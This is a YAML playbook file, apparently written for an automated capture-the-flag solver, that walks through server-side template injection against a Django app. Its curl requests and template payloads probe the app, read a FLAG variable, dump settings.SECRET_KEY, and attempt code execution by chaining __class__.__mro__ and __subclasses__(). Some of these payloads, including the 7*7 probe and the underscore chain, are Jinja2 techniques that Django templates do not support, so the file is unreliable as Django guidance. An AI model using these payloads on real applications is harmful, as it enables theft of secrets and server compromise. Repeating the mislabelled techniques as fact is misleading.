name: ssti_django
category: web
tags: [ssti, injection, django, template_injection]
indicators:
  - "Django application"
  - "User input rendered in template"
  - "Hint: Check the context"
  - "Template syntax {{ }}"

tricks:
  - name: "Step 1: Identify SSTI injection point"
    when: "First access"
    how: "Try {{7*7}} to see if it returns 49"
    payload: |
      curl 'http://TARGET/greet/?name={{7*7}}'
      # Returns 49 - SSTI confirmed

  - name: "Step 2: Read context variables"
    when: "SSTI confirmed"
    how: "Django templates can access context variables directly"
    payload: |
      {{FLAG}}
      {{my_variable}}

  - name: "Step 3: Access Django settings"
    when: "Need more information"
    how: "Access Django settings object"
    payload: |
      {{settings.SECRET_KEY}}

  - name: "Step 4: Extract the flag"
    when: "FLAG is in context"
    how: "Directly read FLAG variable"
    payload: |
      curl 'http://TARGET/greet/?name={{FLAG}}'
      # FLAG{...}

  - name: "Advanced: Django SSTI RCE"
    when: "Need command execution"
    how: "Chain through __class__.__mro__ to access os module"
    payload: |
      {{''.__class__.__mro__[1].__subclasses__()}}

